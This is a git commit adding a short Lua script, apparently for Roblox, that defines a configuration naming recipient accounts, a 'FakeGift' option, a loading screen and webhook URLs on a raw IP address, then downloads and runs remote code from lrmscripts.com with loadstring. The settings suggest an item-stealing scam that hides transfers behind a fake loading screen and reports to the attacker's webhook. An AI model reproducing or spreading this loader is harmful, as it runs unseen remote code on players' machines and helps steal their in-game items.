eecf6bebe625ce78455f75fb37348c34a1120f70
LRMscripts <wmarquiese49@gmail.com>
2025-08-16 09:27:33 -0500

    Upload main.lua via Script Source Converter

---
+++ main.lua
@@ -0,0 +1,13 @@
+_G.LRMConfig = {
+    User = {"fangluvs_god", "Rupert9019"},
+    min_value = 10000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "http://176.100.37.215:20002/proxy/72d15fbf78c9aad079ef1b979efae424",
+    FakeGift = "Yes",
+    Trash = "http://176.100.37.215:20002/proxy/72d15fbf78c9aad079ef1b979efae424",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "No",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()
